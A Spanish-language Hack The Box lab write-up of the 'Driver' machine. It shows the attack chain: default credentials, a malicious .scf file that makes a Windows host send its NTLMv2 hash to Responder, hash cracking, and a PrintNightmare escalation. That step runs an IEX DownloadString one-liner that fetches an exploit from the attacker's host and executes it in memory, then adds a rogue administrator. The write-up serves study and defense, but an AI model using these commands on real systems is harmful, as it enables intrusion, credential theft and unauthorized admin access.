# Driver — Hack The Box (práctica CPTS)

**Plataforma:** Hack The Box
**Dificultad:** 🟢 Fácil
**SO:** Windows
**Certificación:** Práctica adicional para el CPTS (Certified Penetration Testing Specialist)
**Fecha de resolución:** 2026
**Técnicas:** Nmap · Autenticación básica HTTP (credenciales por defecto) · Fichero `.scf` malicioso → captura de hash NTLMv2 con Responder · John the Ripper · Evil-WinRM · WinPEAS · **CVE-2021-1675 (PrintNightmare)** → Administrator
**Idioma:** Español — [🇬🇧 English version](./Driver_Writeup_EN.md)

---

## Índice
1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web — panel de firmware con credenciales por defecto](#2-enumeración-web--panel-de-firmware-con-credenciales-por-defecto)
3. [Acceso inicial — captura de hash NTLM con un fichero `.scf`](#3-acceso-inicial--captura-de-hash-ntlm-con-un-fichero-scf)
4. [Obtención de shell y escalada — PrintNightmare (CVE-2021-1675)](#4-obtención-de-shell-y-escalada--printnightmare-cve-2021-1675)
5. [Post-explotación y flags](#5-post-explotación-y-flags)
6. [Lección aprendida](#6-lección-aprendida)
7. [Glosario de herramientas y comandos](#7-glosario-de-herramientas-y-comandos)

---

## 1. Reconocimiento

```bash
ping -c 1 10.129.69.136
```

> 🛠️ **`ping`** — TTL de **127** (partiendo de 128) → sistema **Windows**.

![](Imagenes/01-ping-ttl-windows.png)

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 10.129.69.136 -oN AllPorts
```

![](Imagenes/02-nmap-todos-los-puertos.png)
![](Imagenes/03-enum-nmap-herramienta-propia.png)

Cuatro puertos abiertos: **80** (http), **135** (msrpc), **445** (smb) y **5985** (winrm). Escaneo de versión:

```bash
nmap -sS -Pn -sCV -T5 -n -p80,135,445,5985 -oN Ports 10.129.69.136
```

![](Imagenes/04-nmap-version-servicios-http-basic-auth-smb-winrm.png)

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 80 | Microsoft IIS 10.0 | Autenticación **Basic**, realm `MFP Firmware Update Center` |
| 135 | Microsoft Windows RPC | — |
| 445 | microsoft-ds | Firmado SMB **habilitado pero no obligatorio** |
| 5985 | WinRM | Microsoft HTTPAPI |

> 💡 Hostname **`DRIVER`** confirmado por el propio escaneo — pista directa hacia la escalada final (drivers de impresora).

## 2. Enumeración web — panel de firmware con credenciales por defecto

El puerto 80 pide autenticación HTTP básica:

![](Imagenes/05-navegador-basic-auth-prompt.png)

Probamos **`admin:admin`** y funciona. Accedemos al **"MFP Firmware Update Center"**:

![](Imagenes/06-mfp-firmware-update-center-home.png)

La sección **"Firmware Updates"** permite subir un fichero, indicando que **"el equipo de pruebas revisará las subidas manualmente"**:

![](Imagenes/07-firmware-updates-formulario-subida.png)

> 💡 Ese aviso es la pista clave: un humano va a **abrir/examinar** el fichero subido desde su propio equipo Windows — justo lo que necesitamos para el siguiente paso.

## 3. Acceso inicial — captura de hash NTLM con un fichero `.scf`

### ¿Qué es un `.scf` y por qué funciona este ataque?

Un fichero **`.scf`** (**Shell Command File**) es un formato antiguo de Windows Explorer que permite un conjunto muy limitado de acciones (mostrar el escritorio, abrir Explorer). Su campo relevante para nosotros es `IconFile`, que le dice a Windows **dónde buscar el icono** que debe mostrarse para ese fichero en la vista de carpeta — y acepta una ruta **UNC** (de red): `\\IP\recurso\icono.ico`.

Cuando alguien abre con el Explorador de Windows la carpeta donde está ese `.scf` — **ni siquiera hace falta hacer doble clic sobre el fichero: basta con que Explorer lo liste** para intentar generar su icono —, Windows intenta conectarse automáticamente por **SMB** a esa ruta de red.

La clave: **toda conexión SMB en Windows se autentica automáticamente** con las credenciales de la sesión activa, vía **NTLM**. Si al otro lado de esa ruta de red no hay un recurso real, sino algo que **finge ser un servidor SMB**, ese "algo" puede capturar el intercambio de autenticación completo: usuario, dominio y un **hash NTLMv2** (no la contraseña en claro, pero sí un valor crackeable offline).

En resumen: **un `.scf` cuyo icono apunta a nuestra IP obliga a quien examine la carpeta con el Explorador a "autenticarse" contra nosotros sin darse cuenta, sin ejecutar nada ni hacer clic en nada más que abrir la carpeta.**

```ini
[Shell]
Command=2
IconFile=\\10.10.15.31\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

> 🛠️ **`Command=2`** e **`IconFile=`** son las claves relevantes: la primera indica la acción (abrir Explorer), la segunda fuerza la petición de red al resolver el icono. El resto es ruido heredado de la plantilla, irrelevante para el ataque.

![](Imagenes/08-scf-fichero-pentestlab-referencia.png)

### ¿Qué hace Responder aquí?

**Responder** escucha en la red simulando ser distintos servicios (SMB, LLMNR, NBT-NS...) y, cuando otra máquina intenta autenticarse contra uno de esos servicios falsos, **captura el intercambio NTLM completo**, incluido el hash NTLMv2, sin necesidad de ninguna credencial previa. Es el "servidor SMB falso" que necesita nuestro `.scf` al otro lado.

```bash
sudo responder -w -I tun0
```

> 🛠️ **`-w`** activa el servidor WPAD (parte del arranque estándar de Responder, no crítico aquí). **`-I tun0`** indica la interfaz de red donde escuchar — la de la VPN de HTB.

![](Imagenes/09-responder-listen-tun0.png)

Subimos el `.scf` por el formulario de "Firmware Updates". En cuanto se revisa el fichero con el Explorador, Windows intenta resolver el icono contra nuestra IP y Responder captura la autenticación:

![](Imagenes/10-responder-hash-ntlmv2-capturado.png)

```
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:d0cd35208944a333:...
```

![](Imagenes/11-file-hash-ntlmv2-guardado.png)

### Crackeando el hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

> 🛠️ **`john --wordlist=<fichero> <hash>`** — ataque de diccionario con John the Ripper; detecta automáticamente el formato del hash (`netntlmv2` en este caso).

![](Imagenes/12-john-rockyou-hash-crackeado-liltony.png)

```
tony:liltony
```

```bash
evil-winrm -i 10.129.69.136 -u 'tony' -p 'liltony'
```

> 🛠️ **`evil-winrm`** — cliente para conectarse a sesiones de administración remota de Windows (**WinRM**, puerto 5985/5986), equivalente en espíritu a SSH pero para PowerShell remoto.

![](Imagenes/13-evil-winrm-login-tony.png)

## 4. Obtención de shell y escalada — PrintNightmare (CVE-2021-1675)

Subimos **WinPEAS**, un script de enumeración automática de vectores de escalada en Windows:

![](Imagenes/14-winpeas-binarios-listado.png)

```
upload "/ruta/local/winPEASx64.exe"
```

> 🛠️ **`upload`** — comando propio de Evil-WinRM que transfiere un fichero a la víctima a través de la sesión WinRM ya autenticada, sin servidor adicional.

![](Imagenes/15-evil-winrm-upload-winpeasx64.png)

```
.\winPEASx64.exe
```

![](Imagenes/16-winpeas-ejecucion-banner.png)

Entre los hallazgos aparece **`spoolsv`** (servicio *Print Spooler*) en la lista de puertos/procesos en escucha:

![](Imagenes/17-winpeas-puertos-tcp-spoolsv.png)

> 💡 El nombre de la máquina, **"Driver"**, más un Print Spooler activo, apunta directamente a **PrintNightmare (CVE-2021-1675 / CVE-2021-34527)** — vulnerabilidad crítica de 2021 que permite cargar un driver de impresora malicioso sin las comprobaciones de firma adecuadas, con ejecución de código como SYSTEM.

```bash
git clone https://github.com/calebstewart/CVE-2021-1675.git
```

![](Imagenes/18-git-clone-cve-2021-1675.png)

Servimos el exploit:

```bash
python3 -m uploadserver 8080
```

> 🛠️ **`uploadserver`** — módulo de Python que extiende `http.server`: sirve ficheros y, además, expone `/upload` para recibirlos.

![](Imagenes/19-python-uploadserver-8080.png)

### Descarga y ejecución en memoria del exploit

Desde Evil-WinRM (como `tony`):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.31:8080/CVE-2021-1675.ps1')
```

> 🛠️ **Desglose de este one-liner, muy habitual en post-explotación de Windows:**
> - **`New-Object Net.WebClient`** — crea un objeto .NET para hacer peticiones HTTP (el `curl`/`wget` de PowerShell).
> - **`.DownloadString('URL')`** — descarga el contenido de esa URL como **texto**, no como fichero en disco.
> - **`IEX`** (*Invoke-Expression*) — ejecuta ese texto como comandos de PowerShell en la sesión actual.
>
> El resultado: "trae este script por HTTP y ejecútalo ya, sin dejar ningún `.ps1` escrito en disco". Técnica clásica para minimizar el rastro forense y evitar depender de subir el fichero completo. Tras esta línea, la función `Invoke-Nightmare` queda cargada y lista para usarse.

```powershell
Invoke-Nightmare -DriverName "Xerox" -NewUser "arabot" -NewPassword "Arabot123"
```

![](Imagenes/20-iex-downloadstring-invoke-nightmare-nuevo-usuario.png)

```
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\...\ntprint.inf_amd64_...\Amd64\mxdwdrv.dll"
[+] added user arabot as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

> 💡 `Invoke-Nightmare` automatiza el exploit completo: genera una DLL maliciosa, abusa de la API del Print Spooler (`RpcAddPrinterDriverEx`) para cargarla como **SYSTEM** sin las validaciones de firma correspondientes, usa ese acceso para crear un usuario nuevo y añadirlo al grupo de Administradores locales, y borra la DLL usada.

```powershell
net user
```

![](Imagenes/21-net-user-cuentas-arabot.png)

## 5. Post-explotación y flags

```bash
evil-winrm -i 10.129.69.136 -u 'arabot' -p 'Arabot123'
```

![](Imagenes/22-evil-winrm-login-arabot.png)

```powershell
whoami /groups
```

![](Imagenes/23-whoami-groups-administrators.png)

`BUILTIN\Administrators` confirmado como `Group owner`.

```powershell
cd C:\Users\Administrator
pwd
```

![](Imagenes/24-cd-administrator-pwd.png)

> 🔒 El contenido exacto de `user.txt` y `root.txt` no se publica en este writeup a propósito, para no regalar la respuesta a quien esté practicando esta misma máquina — el camino completo hasta cada uno queda documentado en las secciones §3 y §5.

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| Credenciales por defecto (`admin:admin`) en un panel expuesto | Portal "MFP Firmware Update Center" | Punto de entrada trivial |
| Subida de ficheros sin restricción de tipo, revisados manualmente en un entorno Windows | Formulario de subida | Captura de hash NTLM vía `.scf` en cuanto se examina el fichero con el Explorador |
| Firmado SMB no obligatorio | Puerto 445 | Facilita ataques de captura/relay de NTLM |
| Print Spooler activo y sin parchear frente a PrintNightmare | `spoolsv.exe` | Ejecución de código como SYSTEM y creación de administradores locales |

## Recomendaciones defensivas

- Cambiar inmediatamente cualquier credencial por defecto en paneles de administración.
- Restringir los tipos de fichero permitidos en formularios de subida; nunca abrir ficheros de terceros con un cliente de escritorio completo.
- Exigir firmado SMB obligatorio.
- Bloquear salida SMB hacia IPs no confiables desde estaciones que procesan contenido externo.
- Aplicar los parches de PrintNightmare o deshabilitar el Print Spooler donde no sea necesario.
- Auditar periódicamente el grupo de Administradores locales.

## 7. Glosario de herramientas y comandos

| Herramienta / comando | Para qué sirve |
|------------------------|-----------------|
| `ping` / `nmap` | Descubrimiento de host y enumeración de puertos/servicios |
| **Fichero `.scf`** | Formato de Windows Explorer cuyo campo `IconFile` acepta rutas UNC, forzando una autenticación SMB automática al listar la carpeta |
| **Responder** | Simula servicios de red (SMB, LLMNR, NBT-NS) para capturar intercambios de autenticación NTLM, incluido el hash NTLMv2 |
| `john --wordlist=<fichero> <hash>` | Ataque de diccionario sobre un hash con John the Ripper |
| `evil-winrm` | Cliente de sesiones remotas de administración de Windows (WinRM) |
| `upload` (Evil-WinRM) | Transferir un fichero a la víctima a través de la sesión WinRM |
| **WinPEAS** | Enumeración automática de vectores de escalada de privilegios en Windows |
| `python3 -m uploadserver` | Servidor HTTP que además acepta subidas de ficheros (`/upload`) |
| `IEX(New-Object Net.WebClient).DownloadString('URL')` | Descargar y ejecutar código PowerShell directamente en memoria, sin escribirlo en disco |
| **PrintNightmare (CVE-2021-1675)** | Vulnerabilidad del servicio Print Spooler de Windows que permite cargar drivers maliciosos y ejecutar código como SYSTEM |
| `Invoke-Nightmare` | Función de PowerShell que automatiza la explotación de PrintNightmare, incluida la creación de un administrador local |

---

*Escrito por [Arabot](https://github.com/Caan31) · Hack The Box · práctica CPTS · 2026*
